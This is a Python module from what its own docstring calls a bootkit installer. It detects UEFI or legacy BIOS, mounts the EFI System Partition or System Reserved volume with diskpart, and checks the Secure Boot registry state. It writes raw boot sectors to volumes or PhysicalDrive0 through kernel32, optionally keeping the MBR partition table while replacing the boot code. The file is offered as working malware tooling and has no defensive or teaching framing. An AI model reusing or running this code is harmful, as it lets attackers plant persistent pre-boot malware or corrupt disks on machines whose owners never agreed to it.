"""
Sector0 - Disk Operations
============================
Disk partition mounting, unmounting, and raw sector access.
"""

import os
import re
import time
import ctypes
from ctypes import wintypes
from typing import Optional, Tuple

try:
    from .utils import log, run_cmd
    from ..config import BASE_DIR
except ImportError:
    from utils import log, run_cmd
    from config import BASE_DIR


class DiskManager:
    """Manages disk operations for bootkit installation."""
    
    # Windows API constants
    GENERIC_READ = 0x80000000
    GENERIC_WRITE = 0x40000000
    FILE_SHARE_READ = 0x01
    FILE_SHARE_WRITE = 0x02
    OPEN_EXISTING = 3
    
    def __init__(self):
        self._temp_files = []
        self._kernel32 = None
    
    @property
    def kernel32(self):
        """Lazy load kernel32."""
        if self._kernel32 is None:
            self._kernel32 = ctypes.windll.kernel32
        return self._kernel32
    
    def _temp_file(self, name: str) -> str:
        """Create a temporary file path and track it for cleanup."""
        path = os.path.join(BASE_DIR, f"tmp_{name}.txt")
        self._temp_files.append(path)
        return path
    
    def _cleanup_temp_files(self) -> None:
        """Remove all temporary files."""
        for path in self._temp_files:
            try:
                if os.path.exists(path):
                    os.remove(path)
            except Exception:
                pass
        self._temp_files.clear()
    
    def detect_boot_mode(self) -> str:
        """
        Detect whether system is UEFI or Legacy BIOS.
        
        Returns:
            "UEFI" or "BIOS"
        """
        tmp = self._temp_file("detect")
        
        try:
            with open(tmp, 'w') as f:
                f.write("list volume\nexit\n")
            
            output = run_cmd(["diskpart", "/s", tmp])
            
            # Look for FAT32 EFI System Partition
            for line in output.splitlines():
                if "FAT32" in line and ("System" in line or "Hidden" in line):
                    if "Volume" in line and re.search(r'\d+\s*(GB|MB)', line):
                        return "UEFI"
            
            # Check environment variable
            if os.environ.get('firmware_type', '').upper() == 'UEFI':
                return "UEFI"
            
            return "BIOS"
            
        finally:
            self._cleanup_temp_files()
    
    def mount_partition(self, is_uefi: bool) -> str:
        """
        Mount the appropriate boot partition.
        
        Args:
            is_uefi: True for EFI System Partition, False for System Reserved
        
        Returns:
            Drive path (e.g., "F:\\")
        
        Raises:
            Exception if partition not found or mount fails
        """
        tmp_list = self._temp_file("list")
        tmp_mount = self._temp_file("mount")
        
        try:
            # List volumes
            with open(tmp_list, 'w') as f:
                f.write("list volume\nexit\n")
            
            output = run_cmd(["diskpart", "/s", tmp_list])
            
            # Find target volume
            volume_num = self._find_boot_volume(output, is_uefi)
            
            if not volume_num:
                partition_type = "EFI System Partition" if is_uefi else "System Reserved"
                raise Exception(f"{partition_type} not found")
            
            # Mount the volume
            with open(tmp_mount, 'w') as f:
                f.write(f"select volume {volume_num}\nassign\nexit\n")
            
            run_cmd(["diskpart", "/s", tmp_mount])
            
            # Get assigned drive letter
            with open(tmp_list, 'w') as f:
                f.write("list volume\nexit\n")
            
            output = run_cmd(["diskpart", "/s", tmp_list])
            drive_letter = self._get_volume_letter(output, volume_num)
            
            if not drive_letter:
                raise Exception(f"Could not determine drive letter for volume {volume_num}")
            
            # Wait for mount
            time.sleep(2)
            
            drive_path = f"{drive_letter}:\\"
            if not os.path.isdir(drive_path):
                raise Exception(f"Mount failed: {drive_path} not accessible")
            
            log(f"Mounted volume {volume_num} at {drive_path}")
            return drive_path
            
        finally:
            self._cleanup_temp_files()
    
    def unmount(self, drive_path: str) -> None:
        """
        Unmount a drive letter.
        
        Args:
            drive_path: Drive path (e.g., "F:\\" or "F:")
        """
        tmp_list = self._temp_file("umount_list")
        tmp_remove = self._temp_file("umount")
        
        drive_letter = drive_path.strip(':\\')
        
        try:
            # Find volume number
            with open(tmp_list, 'w') as f:
                f.write("list volume\nexit\n")
            
            output = run_cmd(["diskpart", "/s", tmp_list])
            
            volume_num = None
            for line in output.splitlines():
                if re.search(rf"Volume\s+\d+\s+{drive_letter}\s+", line):
                    match = re.search(r'Volume\s+(\d+)', line)
                    if match:
                        volume_num = match.group(1)
                        break
            
            if volume_num:
                with open(tmp_remove, 'w') as f:
                    f.write(f"select volume {volume_num}\nremove letter={drive_letter}\nexit\n")
                run_cmd(["diskpart", "/s", tmp_remove])
                log(f"Unmounted {drive_letter}:")
            else:
                log(f"Volume for {drive_letter}: not found", "WARNING")
                
        except Exception as e:
            log(f"Unmount failed: {e}", "WARNING")
        finally:
            self._cleanup_temp_files()
    
    def _find_boot_volume(self, diskpart_output: str, is_uefi: bool) -> Optional[str]:
        """Find the boot volume number from diskpart output."""
        for line in diskpart_output.splitlines():
            if "Volume" not in line:
                continue
            
            if is_uefi:
                # UEFI: FAT32 with System or Hidden flag
                if "FAT32" in line and ("System" in line or "Hidden" in line):
                    match = re.search(r'Volume\s+(\d+)', line)
                    if match:
                        return match.group(1)
            else:
                # Legacy: NTFS with System or Active flag
                if "System" in line or "Active" in line:
                    # Skip removable media
                    if any(x in line for x in ["CD-ROM", "Removable", "DVD"]):
                        continue
                    if "NTFS" in line or "Partition" in line:
                        match = re.search(r'Volume\s+(\d+)', line)
                        if match:
                            return match.group(1)
        return None
    
    def _get_volume_letter(self, diskpart_output: str, volume_num: str) -> Optional[str]:
        """Get the drive letter for a volume number."""
        pattern = rf"Volume\s+{re.escape(volume_num)}\s+([A-Z])\s+"
        for line in diskpart_output.splitlines():
            match = re.search(pattern, line)
            if match:
                return match.group(1)
        return None
    
    def get_esp_location(self) -> Tuple[str, str]:
        """
        Get the disk and partition number of the EFI System Partition.
        
        Returns:
            Tuple of (disk_num, partition_num)
        """
        tmp_disk = self._temp_file("disk_list")
        tmp_part = self._temp_file("part_list")
        
        try:
            # Find GPT disk
            with open(tmp_disk, 'w') as f:
                f.write("list disk\nexit\n")
            
            output = run_cmd(["diskpart", "/s", tmp_disk])
            
            disk_num = "0"
            for line in output.splitlines():
                if "GPT" in line:
                    match = re.search(r'Disk\s+(\d+)', line)
                    if match:
                        disk_num = match.group(1)
                        break
            
            # Find System partition
            with open(tmp_part, 'w') as f:
                f.write(f"select disk {disk_num}\nlist partition\nexit\n")
            
            output = run_cmd(["diskpart", "/s", tmp_part])
            
            for line in output.splitlines():
                if "System" in line:
                    match = re.search(r'Partition\s+(\d+)', line, re.IGNORECASE)
                    if match:
                        return (disk_num, match.group(1))
            
            raise Exception("EFI System Partition not found")
            
        finally:
            self._cleanup_temp_files()
    
    def write_sector(
        self,
        target: str,
        data: bytes,
        sector: int = 0,
        preserve_partition_table: bool = False
    ) -> bool:
        """
        Write data to a raw disk sector.
        
        Args:
            target: Volume path (e.g., "\\\\.\\F:") or disk path (e.g., "\\\\.\\PhysicalDrive0")
            data: Data to write (will be padded/truncated to 512 bytes)
            sector: Sector number to write to
            preserve_partition_table: If True, preserve bytes 0x1BE-0x1FF (MBR partition table)
        
        Returns:
            True on success, False on failure
        """
        # Prepare 512-byte sector
        sector_data = bytearray(data[:512])
        if len(sector_data) < 512:
            sector_data.extend(b'\x00' * (512 - len(sector_data)))
        
        # Ensure boot signature
        sector_data[510] = 0x55
        sector_data[511] = 0xAA
        
        try:
            handle = self.kernel32.CreateFileW(
                target,
                self.GENERIC_READ | self.GENERIC_WRITE,
                self.FILE_SHARE_READ | self.FILE_SHARE_WRITE,
                None,
                self.OPEN_EXISTING,
                0,
                None
            )
            
            if handle == -1:
                error = ctypes.get_last_error()
                log(f"Cannot open {target}: error {error}", "ERROR")
                return False
            
            try:
                # If preserving partition table, read current sector first
                if preserve_partition_table:
                    current = (ctypes.c_char * 512)()
                    bytes_read = wintypes.DWORD()
                    self.kernel32.ReadFile(handle, current, 512, ctypes.byref(bytes_read), None)
                    
                    # Preserve partition table (0x1BE to 0x1FF)
                    original = bytes(current)
                    sector_data[0x1BE:0x200] = original[0x1BE:0x200]
                    
                    # Seek back to beginning
                    self.kernel32.SetFilePointer(handle, sector * 512, None, 0)
                elif sector > 0:
                    self.kernel32.SetFilePointer(handle, sector * 512, None, 0)
                
                # Write sector
                bytes_written = wintypes.DWORD()
                success = self.kernel32.WriteFile(
                    handle,
                    bytes(sector_data),
                    512,
                    ctypes.byref(bytes_written),
                    None
                )
                
                if success and bytes_written.value == 512:
                    log(f"Wrote 512 bytes to {target} sector {sector}")
                    return True
                else:
                    error = ctypes.get_last_error()
                    log(f"Write failed: error {error}", "ERROR")
                    return False
                    
            finally:
                self.kernel32.CloseHandle(handle)
                
        except Exception as e:
            log(f"Sector write failed: {e}", "ERROR")
            return False

    # =========================================================================
    # Aliases for legacy.py and uefi.py compatibility
    # =========================================================================
    
    def find_system_volume(self, is_uefi: bool) -> Optional[str]:
        """
        Find the system volume number.
        
        Args:
            is_uefi: True for ESP, False for System Reserved
        
        Returns:
            Volume number as string, or None if not found
        """
        tmp_list = self._temp_file("find_vol")
        
        try:
            with open(tmp_list, 'w') as f:
                f.write("list volume\nexit\n")
            
            output = run_cmd(["diskpart", "/s", tmp_list])
            return self._find_boot_volume(output, is_uefi)
        finally:
            self._cleanup_temp_files()
    
    def mount_volume(self, volume_num: str) -> str:
        """
        Mount a volume by number and return the drive path.
        
        Args:
            volume_num: Volume number from find_system_volume()
        
        Returns:
            Drive path (e.g., "F:\\")
        """
        tmp_mount = self._temp_file("mount_vol")
        tmp_list = self._temp_file("list_vol")
        
        try:
            # Assign drive letter
            with open(tmp_mount, 'w') as f:
                f.write(f"select volume {volume_num}\nassign\nexit\n")
            
            run_cmd(["diskpart", "/s", tmp_mount])
            time.sleep(1)
            
            # Get assigned letter
            with open(tmp_list, 'w') as f:
                f.write("list volume\nexit\n")
            
            output = run_cmd(["diskpart", "/s", tmp_list])
            drive_letter = self._get_volume_letter(output, volume_num)
            
            if not drive_letter:
                raise Exception(f"Could not get drive letter for volume {volume_num}")
            
            drive_path = f"{drive_letter}:\\"
            time.sleep(1)
            
            return drive_path
        finally:
            self._cleanup_temp_files()
    
    def unmount_volume(self, drive_path: str) -> None:
        """Alias for unmount()."""
        self.unmount(drive_path)
    
    def check_secure_boot(self) -> bool:
        """
        Check if Secure Boot is enabled.
        
        Returns:
            True if Secure Boot is enabled
        """
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Control\SecureBoot\State"
            )
            value, _ = winreg.QueryValueEx(key, "UEFISecureBootEnabled")
            winreg.CloseKey(key)
            return value == 1
        except Exception:
            return False